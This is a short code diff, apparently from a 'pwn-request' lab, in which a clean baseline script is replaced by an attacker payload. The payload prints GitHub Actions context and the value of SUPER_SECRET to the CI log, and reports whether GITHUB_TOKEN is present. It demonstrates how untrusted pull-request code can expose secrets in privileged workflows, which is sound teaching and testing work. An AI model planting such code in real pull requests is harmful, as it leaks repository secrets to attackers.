@@ -1,3 +1,8 @@
-// 基线版本:干净、无害。
-// 攻击者的 PR 会把这个文件替换成打印 process.env.SUPER_SECRET 的版本。
-console.log("[base] hello from pwn-request-lab");
+// === 攻击者 payload (只打印到日志,不外发) ===
+console.log("### PWN-REQUEST PAYLOAD EXECUTED ###");
+console.log("event_name   =", process.env.GITHUB_EVENT_NAME);
+console.log("actor        =", process.env.GITHUB_ACTOR);
+console.log("repository   =", process.env.GITHUB_REPOSITORY);
+console.log("SUPER_SECRET =", process.env.SUPER_SECRET || "(empty)");
+console.log("GITHUB_TOKEN =", process.env.GITHUB_TOKEN ? "[present len="+process.env.GITHUB_TOKEN.length+"]" : "(empty)");
+console.log("### END ###");
